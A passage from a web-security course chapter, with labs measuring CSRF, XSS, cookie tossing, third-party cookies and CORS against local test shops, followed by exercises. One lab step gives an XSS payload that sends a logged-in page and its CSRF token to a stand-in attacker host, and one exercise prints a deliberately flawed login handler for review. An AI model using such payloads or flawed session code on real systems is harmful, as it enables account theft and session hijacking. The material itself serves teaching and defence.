== Part A1: CSRF from another site (evil.localhost) ==
endpoint (defence)                  SameSite=none     SameSite=unset    SameSite=lax      SameSite=strict   
transfer                            STOLEN            STOLEN            no cookie         no cookie         
transfer-get                        STOLEN            STOLEN            STOLEN            no cookie         
transfer-token                      rejected          rejected          no cookie         no cookie         
transfer-origin                     rejected          rejected          no cookie         no cookie         
transfer-fetchmeta                  rejected          rejected          no cookie         no cookie         
transfer-json                       preflight fails   preflight fails   preflight fails   preflight fails   

== Part A2: the same attack from a sibling subdomain (blog.shop.localhost, same site) ==
endpoint (defence)                  SameSite=none     SameSite=unset    SameSite=lax      SameSite=strict   
transfer                            STOLEN            STOLEN            STOLEN            STOLEN            
transfer-get                        STOLEN            STOLEN            STOLEN            STOLEN            
transfer-token                      rejected          rejected          rejected          rejected          
transfer-origin                     rejected          rejected          rejected          rejected          
transfer-fetchmeta                  rejected          rejected          rejected          rejected          
transfer-json                       preflight fails   preflight fails   preflight fails   preflight fails   

== Part B: XSS in /search ==
HttpOnly off  the attacker's server received:  c=sid=<id>
            the injected script's own transfer:    EXECUTED as alice   mallory's balance: 50
HttpOnly on   the attacker's server received:  c=
            the injected script's own transfer:    EXECUTED as alice   mallory's balance: 50

== Part C: cookie tossing from blog.shop.localhost ==
the shop rotates the id at login (correct)
   planted by the sibling page: sid=<A>; Domain=shop.localhost; Path=/
   victim's browser holds:      sid (.shop.localhost), sid (shop.localhost)
   victim logs in as alice; /account shows: HTTP 401, not logged in
   attacker, holding only <A>, asks /account: HTTP 401
the shop keeps the id at login (fixation bug)
   planted by the sibling page: sid=<A>; Domain=shop.localhost; Path=/
   victim's browser holds:      sid (.shop.localhost), sid (shop.localhost)
   victim logs in as alice; /account shows: alice
   attacker, holding only <A>, asks /account: alice
the shop rotates the id, cookie named __Host-sid
   planted by the sibling page: __Host-sid=<A>; Domain=shop.localhost; Secure; Path=/
   victim's browser holds:      __Host-sid (shop.localhost)
   victim logs in as alice; /account shows: alice
   attacker, holding only <A>, asks /account: HTTP 401
```

What to notice:

- **Part A1 (from `evil.localhost`).** With `SameSite=none` and with the attribute left out, the cookie-only `transfer` and `transfer-get` are `STOLEN`.  
  `Lax` stops the form `POST` and not the link. `Strict` stops both.  
  The three server-side checks do not need `SameSite` at all: whenever the cookie is attached they say `rejected`.  
  The JSON endpoint stops the request inside the browser (`preflight fails`).

- **Part A2 (from `blog.shop.localhost`, same site).** `SameSite` is irrelevant, including `Strict`.  
  Only the token, `Origin` and `Sec-Fetch-Site` checks reject.

- **Part B: XSS.** `HttpOnly off` lets the attacker's server receive `sid=<id>`. `HttpOnly on` gives it an empty string.  
  The injected script's own transfer is `EXECUTED as alice` both times.

- **Part C: tossing.** The three runs of 10.04: a lockout, a hijack, and a refusal by the browser.  
  The browser's own cookie list after the login shows both `sid` cookies in the first two runs, the planted one for `.shop.localhost`.

Things to try:

01. `PORT=9401 node drivers/attacks.js | sed 's/9401/9400/g' | diff - out/lab05_attacks.txt` prints nothing: the Rust shop gives the same matrix.

02. In the driver's `tossing` function, remove `Domain=shop.localhost;` from the planted `__Host-sid` string and rerun.  
  The browser accepts it, but as a cookie of `blog.shop.localhost` alone: the list shows `__Host-sid (blog.shop.localhost), __Host-sid (shop.localhost)`,  
  the victim's login on the shop works, and the attacker's id is `HTTP 401`. The prefix stops the planting, not the sibling's existence.

03. Replace the XSS payload by `<script>fetch('/account').then(r=>r.text()).then(t=>{new Image().src='http://evil.localhost:9400/collect?c='+encodeURIComponent(t)})</script>`, with `HttpOnly` on.  
  The attacker's sink logs `COLLECTED c=<html><body><h1>alice</h1><p>balance: 1000</p><form ...><input type="hidden" name="csrf" value="...">`: the whole page, and the CSRF token the form defence relies on.  
  `HttpOnly` protects the cookie. It does not protect what the user can see.

### Lab 06: third-party cookies

Goal: embed the shop in an iframe on two other sites and see which of three cookies reach it, with Chromium's defaults and with third-party cookie blocking switched on.

```js
// Lab 06: third-party cookies, with and without blocking, and what Partitioned (CHIPS) changes.
// The shop (shop.localhost) is embedded in an <iframe> on two other sites, evil.localhost and other.localhost.
// Three cookies are in play, all SameSite=None; Secure so that SameSite does not get in the way:
//   fp  set during a first-party visit to the shop
//   wu  set by the shop from inside the iframe, unpartitioned
//   wp  set by the shop from inside the iframe, with the Partitioned attribute
// Run twice: Chromium's defaults, then with Chromium's third-party cookie blocking switched on over the DevTools
// protocol (Network.setCookieControls), which is what Incognito and a blocking setting do.
const { chromium } = require('playwright');
const { url, reset, clearLog, readLog, settle, pad } = require('./lib');

const SET = ['wu=1; SameSite=None; Secure; Path=/', 'wp=1; SameSite=None; Secure; Partitioned; Path=/'];

async function embed(page, topHost, shopPath) {
  await page.goto(url(topHost, '/blank'));
  await clearLog();
  await page.evaluate(src => new Promise(res => { const f = document.createElement('iframe'); f.onload = res; f.src = src; document.body.appendChild(f); }), url('shop.localhost', shopPath));
  await settle(page, 300);
  return (await readLog()).filter(r => r.host === 'shop.localhost').pop();
}

(async () => {
  for (const blocking of [false, true]) {
    await reset();
    const browser = await chromium.launch({ channel: 'chromium' });
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    if (blocking) {
      const cdp = await ctx.newCDPSession(page);
      await cdp.send('Network.enable');
      await cdp.send('Network.setCookieControls', { enableThirdPartyCookieRestriction: true, disableThirdPartyCookieMetadata: true, disableThirdPartyCookieHeuristics: true });
    }
    console.log(`== ${blocking ? 'third-party cookie blocking ON' : 'Chromium defaults'}  (${browser.version()}) ==`);
    await page.goto(url('shop.localhost', '/set?c=' + encodeURIComponent('fp=1; SameSite=None; Secure; Path=/')));
    const steps = [];
    steps.push(['iframe on evil.localhost, the shop sets wu and wp', await embed(page, 'evil.localhost', '/set?' + SET.map(c => 'c=' + encodeURIComponent(c)).join('&'))]);
    steps.push(['iframe on evil.localhost, second load', await embed(page, 'evil.localhost', '/echo')]);
    steps.push(['iframe on other.localhost', await embed(page, 'other.localhost', '/echo')]);
    await clearLog();
    await page.goto(url('shop.localhost', '/echo'));
    steps.push(['the shop opened directly (first party)', (await readLog()).pop()]);
    console.log(pad('request to the shop', 54) + 'cookies sent');
    for (const [label, rec] of steps) console.log(pad(label, 54) + `[${rec.cookies.join(', ')}]`);
    const held = (await ctx.cookies()).map(c => `${c.name}${c.partitionKey ? ' (partition ' + (c.partitionKey.topLevelSite || c.partitionKey) + ')' : ''}`);
    console.log('the browser holds: ' + held.join(', ') + '\n');
    await browser.close();
  }
})();
```

Run: `node drivers/thirdparty.js`.  
The driver launches the full Chromium build (`channel: 'chromium'`) and turns blocking on through the DevTools protocol command `Network.setCookieControls`,  
the same setting as Chrome's "Block third-party cookies" switch.

```text
== Chromium defaults  (153.0.8010.12) ==
request to the shop                                   cookies sent
iframe on evil.localhost, the shop sets wu and wp     [fp]
iframe on evil.localhost, second load                 [fp, wu, wp]
iframe on other.localhost                             [fp, wu]
the shop opened directly (first party)                [fp, wu]
the browser holds: fp, wu, wp (partition http://evil.localhost)

== third-party cookie blocking ON  (153.0.8010.12) ==
request to the shop                                   cookies sent
iframe on evil.localhost, the shop sets wu and wp     []
iframe on evil.localhost, second load                 [wp]
iframe on other.localhost                             []
the shop opened directly (first party)                [fp]
the browser holds: fp, wp (partition http://evil.localhost)
```

What to notice: the reading in 10.05 is this transcript line by line.  
The differences between the two halves are the whole story: `wu` is gone, `fp` is withheld in an embed, and `wp` is the only cookie that works and only on the site that created it,  
`http://evil.localhost`, whose name appears as the cookie's partition.

Things to try:

01. Add a step that embeds the shop's `/set` with the `wp` string from `other.localhost`.  
  The browser then holds `wp (partition http://evil.localhost), wp (partition http://other.localhost)`: two cookies with one name, one per embedding site, in both modes.

02. Remove `Partitioned` from the `wp` string.  
  With blocking off, `wp` is sent in every embed (`[fp, wu, wp]` on `other.localhost` as well): it tracks like `wu`. With blocking on, it is never stored, like `wu`, and the second load shows `[]`.

03. Rename `wp` to `__Host-wp`. The prefix and `Partitioned` combine: the cookie is kept, partitioned under `http://evil.localhost`, and sent in the same places as before.  
  A partitioned cookie can and should carry `__Host-`.

### Lab 07: CORS

**Part A: `curl`, which enforces nothing.** `lab07_curl.cmds`, run with `./play.sh lab07_curl.cmds`:

```sh
# CORS is enforced by the browser. The server only sends its policy, and curl, which enforces nothing, reads every answer.
# 0. Start from a clean server, so that request ids and counters begin at zero
curl -s --noproxy "" -X POST http://127.0.0.1:9400/__reset
# 1. A request from the allowed origin and one from another: the allowlist policy answers each differently
./wire.sh http://api.shop.localhost:9400/api/data?cors=allowlist -H 'Origin: http://app.shop.localhost:9400'
./wire.sh http://api.shop.localhost:9400/api/data?cors=allowlist -H 'Origin: http://evil.localhost:9400'

# 2. The policy that sends no CORS field at all: the body is still fully readable to curl
curl -s --noproxy '' -H 'Origin: http://evil.localhost:9400' http://api.shop.localhost:9400/api/data?cors=none

# 3. A preflight: what a browser sends before a PUT with a JSON body, and what the server must answer
./wire.sh -X OPTIONS http://api.shop.localhost:9400/api/data?cors=allowlist -H 'Origin: http://app.shop.localhost:9400' -H 'Access-Control-Request-Method: PUT' -H 'Access-Control-Request-Headers: content-type'

# 4. The same preflight from another origin: no Access-Control-Allow-Origin, so the browser will not send the PUT
./wire.sh -X OPTIONS http://api.shop.localhost:9400/api/data?cors=allowlist -H 'Origin: http://evil.localhost:9400' -H 'Access-Control-Request-Method: PUT' -H 'Access-Control-Request-Headers: content-type'

# 5. The wildcard together with credentials: both fields are sent, and a browser refuses the combination
./wire.sh http://api.shop.localhost:9400/api/data?cors=starcreds -H 'Origin: http://app.shop.localhost:9400'
```

```text
# CORS is enforced by the browser. The server only sends its policy, and curl, which enforces nothing, reads every answer.
# 0. Start from a clean server, so that request ids and counters begin at zero
$ curl -s --noproxy "" -X POST http://127.0.0.1:9400/__reset
reset

# 1. A request from the allowed origin and one from another: the allowlist policy answers each differently
$ ./wire.sh http://api.shop.localhost:9400/api/data?cors=allowlist -H 'Origin: http://app.shop.localhost:9400'
> GET /api/data?cors=allowlist HTTP/1.1
> Host: api.shop.localhost:9400
> Origin: http://app.shop.localhost:9400
> 
< HTTP/1.1 200 OK
< Vary: Origin
< Access-Control-Allow-Origin: http://app.shop.localhost:9400
< Access-Control-Allow-Credentials: true
< X-Request-Id: r-1
< 

$ ./wire.sh http://api.shop.localhost:9400/api/data?cors=allowlist -H 'Origin: http://evil.localhost:9400'
> GET /api/data?cors=allowlist HTTP/1.1
> Host: api.shop.localhost:9400
> Origin: http://evil.localhost:9400
> 
< HTTP/1.1 200 OK
< Vary: Origin
< X-Request-Id: r-2
< 


# 2. The policy that sends no CORS field at all: the body is still fully readable to curl
$ curl -s --noproxy '' -H 'Origin: http://evil.localhost:9400' http://api.shop.localhost:9400/api/data?cors=none
{"user": null, "counter": 0}


# 3. A preflight: what a browser sends before a PUT with a JSON body, and what the server must answer
$ ./wire.sh -X OPTIONS http://api.shop.localhost:9400/api/data?cors=allowlist -H 'Origin: http://app.shop.localhost:9400' -H 'Access-Control-Request-Method: PUT' -H 'Access-Control-Request-Headers: content-type'
> OPTIONS /api/data?cors=allowlist HTTP/1.1
> Host: api.shop.localhost:9400
> Origin: http://app.shop.localhost:9400
> Access-Control-Request-Method: PUT
> Access-Control-Request-Headers: content-type
> 
< HTTP/1.1 204 No Content
< Vary: Origin
< Access-Control-Allow-Origin: http://app.shop.localhost:9400
< Access-Control-Allow-Credentials: true
< Access-Control-Allow-Methods: GET, POST, PUT
< Access-Control-Allow-Headers: content-type
< Access-Control-Max-Age: 600
< 


# 4. The same preflight from another origin: no Access-Control-Allow-Origin, so the browser will not send the PUT
$ ./wire.sh -X OPTIONS http://api.shop.localhost:9400/api/data?cors=allowlist -H 'Origin: http://evil.localhost:9400' -H 'Access-Control-Request-Method: PUT' -H 'Access-Control-Request-Headers: content-type'
> OPTIONS /api/data?cors=allowlist HTTP/1.1
> Host: api.shop.localhost:9400
> Origin: http://evil.localhost:9400
> Access-Control-Request-Method: PUT
> Access-Control-Request-Headers: content-type
> 
< HTTP/1.1 204 No Content
< Vary: Origin
< Access-Control-Allow-Methods: GET, POST, PUT
< Access-Control-Allow-Headers: content-type
< Access-Control-Max-Age: 600
< 


# 5. The wildcard together with credentials: both fields are sent, and a browser refuses the combination
$ ./wire.sh http://api.shop.localhost:9400/api/data?cors=starcreds -H 'Origin: http://app.shop.localhost:9400'
> GET /api/data?cors=starcreds HTTP/1.1
> Host: api.shop.localhost:9400
> Origin: http://app.shop.localhost:9400
> 
< HTTP/1.1 200 OK
< Access-Control-Allow-Origin: *
< Access-Control-Allow-Credentials: true
< X-Request-Id: r-4
< 
```

What to notice:

- **Step 1: the allowlist answers by `Origin`.**  
  The allowed origin gets `Allow-Origin` and `Allow-Credentials`; another gets neither, but the server still **ran the request** (`X-Request-Id: r-2` is a new request, and a write would have executed too).  
  `Vary: Origin` is on both.

- **Step 2: `cors=none` and `curl` reads the body.** Nothing in CORS stops a client that is not a browser.

- **Steps 3 and 4: the preflight.**  
  A browser sends exactly this `OPTIONS` with `Access-Control-Request-Method: PUT` and `Access-Control-Request-Headers: content-type`.  
  The allowed origin gets the approval with `Max-Age: 600`.  
  The other origin gets `204` with the method and header lists but **no `Access-Control-Allow-Origin`**, and the browser stops there: the real `PUT` is never sent.

- **Step 5: the wildcard with credentials.** The server sends both, and a browser refuses the combination (Part B).

**Part B: Chromium.** `drivers/cors.js` sends four kinds of request from three pages to `api.shop.localhost` under each of the nine policies and reads the answer in the page's script,  
the server's log for whether a write executed, and Chromium's console messages:

```js
// Lab 07: CORS in Chromium. A page on one origin calls api.shop.localhost with four kinds of request, against the
// shop's nine CORS policies. alice is logged in with a cookie that api.shop.localhost receives even from another
// site (Domain=shop.localhost, SameSite=None), so every policy that lets a page READ the answer also lets it read alice's data.
//   GET                  a simple request, no cookies
//   GET + cookies        a simple request with credentials: 'include'
//   PUT json + cookies   not simple: the browser sends a preflight first
//   POST text/plain      simple, with cookies: no preflight even though it writes
// A cell says what the page's script got: read(user) or blocked, and a star when the server executed a write.
const { PORT, url, sleep, reset, clearLog, readLog, launch, settle, pad } = require('./lib');

const LEGIT = 'app.shop.localhost';
const EVIL = 'evil.localhost';
const EVIL2 = 'evil-shop.localhost';
const MODES = ['none', 'star', 'echo', 'echo-vary', 'creds', 'starcreds', 'allowlist', 'containsbug', 'null'];
const api = mode => url('api.shop.localhost', `/api/data?cors=${mode}&expose=off`);

async function loginAlice(page) {
  await page.goto(url('shop.localhost', '/blank'));
  await page.evaluate(() => fetch('/login?samesite=none&domain=on', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'user=alice&password=wonderland' }));
}

// Runs one kind of request in the page and reports what the script saw.
const KINDS = {
  'GET': t => fetch(t),
  'GET+cookies': t => fetch(t, { credentials: 'include' }),
  'PUT json+cookies': t => fetch(t, { method: 'PUT', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: '{}' }),
  'POST text/plain': t => fetch(t, { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'text/plain' }, body: 'x' }),
};

async function cell(page, kind, target) {
  await clearLog();
  const consoleMessages = [];
  const onConsole = m => { if (m.type() === 'error') consoleMessages.push(m.text()); };
  page.on('console', onConsole);
  const seen = await page.evaluate(async ([k, t, src]) => {
    try { const r = await eval(src)(t); const j = await r.json(); return `read(${j.user})`; }
    catch (e) { return 'blocked'; }
  }, [kind, target, KINDS[kind].toString()]);
  await settle(page, 150);
  page.off('console', onConsole);
  const log = await readLog();
  const executed = log.some(r => /EXECUTED/.test(r.note));
  const preflight = log.some(r => r.method === 'OPTIONS');
  return { text: seen + (executed ? '*' : ''), preflight, consoleMessages };
}

(async () => {
  const browser = await launch();
  const cases = [];
  for (const mode of MODES) for (const host of [LEGIT, EVIL]) cases.push([mode, host]);
  for (const mode of ['creds', 'allowlist', 'containsbug']) cases.push([mode, EVIL2]);

  console.log('== Part A: nine policies, three origins ==');
  console.log(pad('policy (cors=)', 16) + pad('page origin', 22) + Object.keys(KINDS).map(k => pad(k, 20)).join(''));
  const messages = {};
  for (const [mode, host] of cases) {
    await reset();
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    await loginAlice(page);
    await page.goto(url(host, '/blank'));
    let row = pad(mode, 16) + pad(host, 22);
    for (const kind of Object.keys(KINDS)) {
      const c = await cell(page, kind, api(mode));
      row += pad(c.text, 20);
      if (c.consoleMessages.length && !messages[`${mode}|${kind}|${host}`]) messages[`${mode}|${kind}|${host}`] = c.consoleMessages[0];
    }
    console.log(row);
    await ctx.close();
  }
  console.log('\n(* = the server executed a write although the page may not have seen the answer)');

  console.log('\n== Part B: what the browser prints for four of them ==');
  for (const key of ['none|GET|evil.localhost', 'starcreds|GET+cookies|evil.localhost', 'allowlist|PUT json+cookies|evil.localhost', 'none|POST text/plain|evil.localhost']) {
    const [mode, kind, host] = key.split('|');
    console.log(`cors=${mode}, ${kind}, page on ${host}:`);
    console.log('   ' + (messages[key] || '(no message)').replace(/http:\/\/api\.shop\.localhost:\d+/g, 'http://api.shop.localhost:PORT').replace(/http:\/\/evil\.localhost:\d+/g, 'http://evil.localhost:PORT'));
  }

  console.log('\n== Part C: the origin null, the preflight cache, exposed headers ==');
  for (const mode of ['null', 'allowlist']) {
    await reset();
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    await loginAlice(page);
    await page.goto(url(EVIL, '/blank'));
    const res = await page.evaluate(t => new Promise(resolve => {
      const f = document.createElement('iframe');
      f.sandbox = 'allow-scripts';
      f.srcdoc = `<script>fetch(${JSON.stringify(t)},{credentials:'include'}).then(r=>r.json()).then(j=>parent.postMessage('read('+j.user+')','*')).catch(()=>parent.postMessage('blocked','*'))<\/script>`;
      window.addEventListener('message', e => resolve(e.data));
      document.body.appendChild(f);
    }), api(mode));
    console.log(`sandboxed iframe (Origin: null), cors=${pad(mode, 10)} ${res}`);
    await ctx.close();
  }
  {
    await reset();
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    await loginAlice(page);
    await page.goto(url(LEGIT, '/blank'));
    await clearLog();
    for (let i = 0; i < 3; i++) {
      await page.evaluate(t => fetch(t, { method: 'PUT', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: '{}' }).then(r => r.json()), api('allowlist'));
    }
    await settle(page, 200);
    const log = await readLog();
    console.log(`three PUTs in a row (Access-Control-Max-Age: 600): ${log.filter(r => r.method === 'OPTIONS').length} preflight, ${log.filter(r => r.method === 'PUT').length} PUTs`);
    for (const expose of ['off', 'on']) {
      const target = url('api.shop.localhost', `/api/data?cors=allowlist&expose=${expose}`);
      const seen = await page.evaluate(async t => { const r = await fetch(t, { credentials: 'include' }); return r.headers.get('X-Request-Id'); }, target);
      console.log(`response.headers.get('X-Request-Id') with expose=${pad(expose, 3)}: ${seen}`);
    }
    await ctx.close();
  }
  await browser.close();
})();
```

Run: `node drivers/cors.js` (about a minute).

```text
== Part A: nine policies, three origins ==
policy (cors=)  page origin           GET                 GET+cookies         PUT json+cookies    POST text/plain     
none            app.shop.localhost    blocked             blocked             blocked             blocked*            
none            evil.localhost        blocked             blocked             blocked             blocked*            
star            app.shop.localhost    read(null)          blocked             blocked             blocked*            
star            evil.localhost        read(null)          blocked             blocked             blocked*            
echo            app.shop.localhost    read(null)          blocked             blocked             blocked*            
echo            evil.localhost        read(null)          blocked             blocked             blocked*            
echo-vary       app.shop.localhost    read(null)          blocked             blocked             blocked*            
echo-vary       evil.localhost        read(null)          blocked             blocked             blocked*            
creds           app.shop.localhost    read(null)          read(alice)         read(alice)*        read(alice)*        
creds           evil.localhost        read(null)          read(alice)         read(alice)*        read(alice)*        
starcreds       app.shop.localhost    read(null)          blocked             blocked             blocked*            
starcreds       evil.localhost        read(null)          blocked             blocked             blocked*            
allowlist       app.shop.localhost    read(null)          read(alice)         read(alice)*        read(alice)*        
allowlist       evil.localhost        blocked             blocked             blocked             blocked*            
containsbug     app.shop.localhost    read(null)          read(alice)         read(alice)*        read(alice)*        
containsbug     evil.localhost        blocked             blocked             blocked             blocked*            
null            app.shop.localhost    blocked             blocked             blocked             blocked*            
null            evil.localhost        blocked             blocked             blocked             blocked*            
creds           evil-shop.localhost   read(null)          read(alice)         read(alice)*        read(alice)*        
allowlist       evil-shop.localhost   blocked             blocked             blocked             blocked*            
containsbug     evil-shop.localhost   read(null)          read(alice)         read(alice)*        read(alice)*        

(* = the server executed a write although the page may not have seen the answer)

== Part B: what the browser prints for four of them ==
cors=none, GET, page on evil.localhost:
   Access to fetch at 'http://api.shop.localhost:PORT/api/data?cors=none&expose=off' from origin 'http://evil.localhost:PORT' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
cors=starcreds, GET+cookies, page on evil.localhost:
   Access to fetch at 'http://api.shop.localhost:PORT/api/data?cors=starcreds&expose=off' from origin 'http://evil.localhost:PORT' has been blocked by CORS policy: The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'.
cors=allowlist, PUT json+cookies, page on evil.localhost:
   Access to fetch at 'http://api.shop.localhost:PORT/api/data?cors=allowlist&expose=off' from origin 'http://evil.localhost:PORT' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.
cors=none, POST text/plain, page on evil.localhost:
   Access to fetch at 'http://api.shop.localhost:PORT/api/data?cors=none&expose=off' from origin 'http://evil.localhost:PORT' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.

== Part C: the origin null, the preflight cache, exposed headers ==
sandboxed iframe (Origin: null), cors=null       read(alice)
sandboxed iframe (Origin: null), cors=allowlist  blocked
three PUTs in a row (Access-Control-Max-Age: 600): 1 preflight, 3 PUTs
response.headers.get('X-Request-Id') with expose=off: null
response.headers.get('X-Request-Id') with expose=on : r-5
```

What to notice: the table of 10.06 is Part A of this transcript; the messages quoted there are Part B; and Part C contains three measurements: the sandboxed `<iframe>`, with `Origin: null`,  
reads alice under `cors=null` and is `blocked` under `allowlist`;  
the preflight cache turns three `PUT`s into one `OPTIONS`; and `X-Request-Id` is `null` to the script unless the server sends `Access-Control-Expose-Headers`.

Things to try:

01. Break the preflight in the two ways the shop knows.  
  Request `.../api/data?cors=allowlist&pf=500` from `app.shop.localhost` with a JSON `PUT`: Chromium reports `Response to preflight request doesn't pass access control check: It does not have HTTP ok status.`  
  With `pf=nohdr`: `Request header field content-type is not allowed by Access-Control-Allow-Headers in preflight response.`

02. Ask for a method the allowlist does not list.  
  `./wire.sh -X OPTIONS 'http://api.shop.localhost:9400/api/data?cors=allowlist' -H 'Origin: http://app.shop.localhost:9400' -H 'Access-Control-Request-Method: DELETE'` answers `204` with `Access-Control-Allow-Methods: GET, POST, PUT`;  
  a browser would not send the `DELETE`.

03. Compare the `GET` and `GET+cookies` columns of the `creds` rows in Part A.  
  Without cookies, `evil.localhost` reads `read(null)`, an anonymous answer; with cookies, `read(alice)`.  
  The reflecting policy is dangerous because of the credentials, not because of the reflection.

### Running everything

`run_all_labs.sh` stops and starts the shops, runs every lab in order, then runs the browser labs and the fixation script again against the Rust shop and compares:

```sh
#!/bin/bash
# Stops and starts the two shops, runs every lab in order against fresh servers, and writes the transcripts to out/.
# Takes about five minutes: Lab 03 waits two minutes for cookies to age past the Lax+POST window.
# Run from the h10/ folder after building the Rust programs and installing Playwright's Chromium.
mkdir -p out logs
./stop_all.sh; ./start_all.sh
JAVA="env -u JAVA_TOOL_OPTIONS java"

./parity.sh                                             > out/parity.txt
node drivers/origins.js                                 > out/lab01_origins.txt
./play.sh lab02_wire.cmds                               > out/lab02_wire.txt
for s in s01_scope s02_parse s03_samesite s04_prefixes; do
    $JAVA java/CookieJar.java scenarios/$s.txt          > out/lab02_jar_$s.txt
    rust/target/release/cookie_jar scenarios/$s.txt     > out/lab02_jar_${s}_rust.txt
done
for x in x01_scope x02_quirks x03_secure; do
    node drivers/crosscheck.js scenarios/$x.txt         > out/lab02_xcheck_$x.txt
done
node drivers/limits.js                                  > out/lab02_limits.txt
node drivers/prefixes.js                                > out/lab02_prefixes.txt
node drivers/samesite.js                                > out/lab03_samesite.txt
$JAVA java/SessionVsToken.java                          > out/lab04_tokens_java.txt
rust/target/release/session_vs_token                    > out/lab04_tokens_rust.txt
diff out/lab04_tokens_java.txt out/lab04_tokens_rust.txt > out/lab04_tokens_diff.txt
./lab04_fixation.sh 9400                                > out/lab04_fixation.txt
node drivers/attacks.js                                 > out/lab05_attacks.txt
node drivers/thirdparty.js                              > out/lab06_thirdparty.txt
./play.sh lab07_curl.cmds                               > out/lab07_curl.txt
node drivers/cors.js                                    > out/lab07_cors.txt

# The browser labs again against the Rust shop: the transcripts must be the same apart from the port
for lab in attacks thirdparty cors; do
    PORT=9401 node drivers/$lab.js | sed 's/9401/9400/g' > out/rust_$lab.txt
done
./lab04_fixation.sh 9401 > out/lab04_fixation_rust.txt
{
  for s in s01_scope s02_parse s03_samesite s04_prefixes; do
      cmp -s out/lab02_jar_$s.txt out/lab02_jar_${s}_rust.txt && echo "jar scenario $s: Java and Rust identical" || echo "jar scenario $s: DIFFERENT"
  done
  diff -q out/lab05_attacks.txt out/rust_attacks.txt > /dev/null && echo "browser lab attacks: Java and Rust shops identical" || echo "browser lab attacks: DIFFERENT"
  diff -q out/lab06_thirdparty.txt out/rust_thirdparty.txt > /dev/null && echo "browser lab thirdparty: Java and Rust shops identical" || echo "browser lab thirdparty: DIFFERENT"
  diff -q out/lab07_cors.txt out/rust_cors.txt > /dev/null && echo "browser lab cors: Java and Rust shops identical" || echo "browser lab cors: DIFFERENT"
  diff -q out/lab04_fixation.txt out/lab04_fixation_rust.txt > /dev/null && echo "fixation script: Java and Rust shops identical" || echo "fixation script: DIFFERENT"
} > out/equivalence.txt
cat out/equivalence.txt
./stop_all.sh
```

```text
jar scenario s01_scope: Java and Rust identical
jar scenario s02_parse: Java and Rust identical
jar scenario s03_samesite: Java and Rust identical
jar scenario s04_prefixes: Java and Rust identical
browser lab attacks: Java and Rust shops identical
browser lab thirdparty: Java and Rust shops identical
browser lab cors: Java and Rust shops identical
fixation script: Java and Rust shops identical
```

---

## 10.09 Exercises

Do each on paper before opening 10.10.  
Every solution was checked by running code: the teaching jar, the lab programs, Chromium, or a short program written for the exercise, each listed in `run_exercises.sh` (10.08, Lab 00 layout).

### Exercise 01: origins, sites and cookie scope

One login response from `https://shop.example.com/account/login` sets five cookies:

```text
Set-Cookie: a=1
Set-Cookie: b=2; Domain=example.com; Path=/
Set-Cookie: c=3; Secure; Path=/; SameSite=Strict
Set-Cookie: d=4; Path=/; SameSite=None; Secure
Set-Cookie: e=5; Path=/; Secure; HttpOnly; SameSite=Lax
```

**Part 1.**  
For each pair below, say whether the request URL is **same-origin** with the page and whether it is **same-site** (treat `com`, `net`, `org`, `co.uk` and `github.io` as public suffixes).

| #   | Page                            | Request URL                               |
| --- | ------------------------------- | ----------------------------------------- |
| 01  | `https://shop.example.com/`     | `https://shop.example.com/account/orders` |
| 02  | `https://shop.example.com/`     | `https://shop.example.com/cart`           |
| 03  | `https://app.example.com/`      | `https://shop.example.com/cart`           |
| 04  | `https://evil.example.net/`     | `https://shop.example.com/cart`           |
| 05  | `https://shop.example.com/`     | `http://shop.example.com/cart`            |
| 06  | `https://shop.example.com/cart` | `https://shop.example.com:443/orders`     |
| 07  | `https://shop.example.com/cart` | `https://shop.example.com:8443/cart`      |
| 08  | `https://shop.example.com/cart` | `https://shop.example.com.evil.net/`      |
| 09  | `https://alice.github.io/`      | `https://bob.github.io/`                  |
| 10  | `https://example.co.uk/`        | `https://other.co.uk/`                    |

**Part 2.**  
Which of the cookies `a` to `e` does the browser send with each request?  
The cookies are all seconds old. A request is made to the shop (`https://shop.example.com`) except where stated.

| #   | The request                                                                                                    |
| --- | -------------------------------------------------------------------------------------------------------------- |
| 01  | The shop's own page runs `fetch('/account/orders')`                                                            |
| 02  | The shop's own page runs `fetch('/cart')`                                                                      |
| 03  | A script on `https://app.example.com/` runs `fetch('https://shop.example.com/cart', {credentials: 'include'})` |
| 04  | An `<img src="https://shop.example.com/cart">` on `https://evil.example.net/`                                  |
| 05  | The user clicks a link on `https://evil.example.net/` to `https://shop.example.com/cart`                       |
| 06  | A form on `https://evil.example.net/` posts to `https://shop.example.com/cart`, 10 seconds after the login     |
| 07  | The user clicks a link on the shop's `https` page to `http://shop.example.com/cart`                            |
| 08  | A script on `https://shop.example.com/` reads `document.cookie`                                                |

### Exercise 02: single sign-on across subdomains

`example.com` runs `accounts.example.com` (the login), `app.example.com` (the product), `docs.example.com` (where customers publish pages that may contain HTML and scripts) and `www.example.com` (marketing, no login).  
One login must serve `accounts` and `app`. The `docs` host must never see the session, and must not be able to log a user out, log them in as someone else, or plant a session.

**Part 1.** Propose the `Set-Cookie` lines and say which host sets each.

**Part 2.** The first design is `Set-Cookie: sso=...; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Lax`, set by `accounts`. Show what the `docs` host can do with it.

**Part 3.** What would you still change about `docs`, even after Part 1?

### Exercise 03: review a login implementation

A shop's login and logout handlers, in the style of a Java servlet:

```java
// POST /login
String sid = request.getParameter("sid");                                              // 01
if (sid == null) sid = String.valueOf(nextId++);                                       // 02  nextId starts at 1000
if (users.passwordMatches(request.getParameter("user"), request.getParameter("password"))) {   // 03
    sessions.put(sid, request.getParameter("user"));                                   // 04
    response.addHeader("Set-Cookie", "sid=" + sid + "; Max-Age=315360000");            // 05
}

// POST /logout
response.addHeader("Set-Cookie", "sid=; Max-Age=0");                                   // 06
```

**Part 1.** List every defect in the session handling. There are at least six. For each, name the attack it permits.

**Part 2.** Write the corrected handlers and the `Set-Cookie` line.

### Exercise 04: CSRF predictions and a layered design

**Part 1.** Predict the outcome of each attack.  
